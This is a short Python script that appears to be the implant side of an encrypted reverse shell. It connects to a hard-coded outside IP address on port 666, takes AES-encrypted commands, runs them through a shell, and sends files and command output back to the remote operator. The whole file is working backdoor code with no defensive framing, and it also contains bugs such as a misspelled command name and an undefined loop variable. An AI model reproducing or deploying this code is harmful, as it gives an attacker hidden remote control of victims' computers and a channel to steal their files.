#!/usr/bin/python

from Crypto.Cipher import AES
import subprocess,socket
import base64
import time
import os

# the block size for the cipher object; must be 16 per FIPS-197
BLOCK_SIZE = 32

# the character used for padding--with a block cipher such as AES, the value
# you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
# used to ensure that your value is always a multiple of BLOCK_SIZE
PADDING = '{'

# one-liner to sufficiently pad the text to be encrypted
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

# one-liners to encrypt/encode and decrypt/decode a string
# encrypt with AES, encode with base64
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

# generate a random secret key
secret = "dz7xf9t6PaC7wN+dPv+QrxHBJ2eGuLAq"

# create a cipher object using the random secret
cipher = AES.new(secret)

HOST = '159.203.35.5'
PORT = 666

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
active = False

# main loop
while True:
    data = s.recv(1024)
    decrypted = DecodeAES(cipher, data)

    time.sleep(0.8)
    success = EncodeAES(cipher, 'Success! We made it!EOFEOFEOFEOFEOFX')
    s.send(success)
    active = True

    # active
    while active:
        # this data is now encrypted
        data = s.recv(1024)

        # decrypt data
        decrypted = DecodeAES(cipher, data)

        # check for quit
        if decrypted.startswith("quit") == True:
            sendData = 'Exit. \n EOFEOFEOFEOFEOFX'
            crptData = EncodeAES(cipher, sendData)
            s.send(crptData)
            active = False

        # check for download
        elif decrypted.startswith("downoad") == True:

            # set file name
            sendFile = decrypted[9:]

            # file transfer
            f = open(sendFile, 'rb')
            while 1:
                fileData = f.read()
                if fileData == '': break
                # begin sending fileData
                s.sendall(fileData)
            f.close
            time.sleep(0.8)

            # l3t server know we are done
            s.sendall('EOFEOFEOFEOFEOFX')
            time.sleep(0.8)
            s.sendall(EncodeAES(cipher, 'Finished download.EOFEOFEOFEOFEOFX'))

        elif decrypted.startswith("upload") == True:

            # set the file name
            downFile = decrypted[7:]

            # file transfer
            g = open(downFile, 'wb')

            # download file
            while True:
                l = s.recv(1024)
                while (l):
                    if l.endswith('EOFEOFEOFEOFEOFX'):
                        u = l[:-16]
                        g.write(u)
                        break
                    else:
                        g.write(l)
                        l = s.recv(1024)
                break
            g.close()
            time.sleep(0.8)

            # let server know we are done
            s.sendall(EncodeAES(cipher, 'Finished upload. EOFEOFEOFEOFEOFX'))

        else:
            # execute command
            proc = subprocess.Popen(decrypted, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

            # save output error.
            stdoutput = proc.stdout.read() + proc.stderr.read() + "EOFEOFEOFEOFEOFX"

            # encrypt output
            encrypted = EncodeAES(cipher, stdoutput)

            # send encrypted output
            s.send(encrypted)


    data = s.recv(1024)
    decrypted = DecodeAES(cipher, data)
    if decrypted == "quit":
        break
    elif decrypted.startswith("download") == True:

        sendFile = decrypted[9:]
        with open(sendFile, 'rb' ) as f:
            while l:
                fileData = f.read()
                if fileData == ".": break
                s.sendall(fileData)
        f.close()
        time.sleep(0.8)

        s.sendall("EOFEOFEOFEOFEOFX")
        time.sleep(0.8)
        s.sendall(EncodeAES(cipher, "Finished download. EOFEOFEOFEOFEOFX"))

    else:
        proc = subprocess.Popen(decrypted, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdoutput = proc.stdout.read() + proc.stderr.read()
        encrypted = EncodeAES(cipher, stdoutput)
        s.send(encrypted)

# loop ends here#
s.send('Bye now!')
s.close()
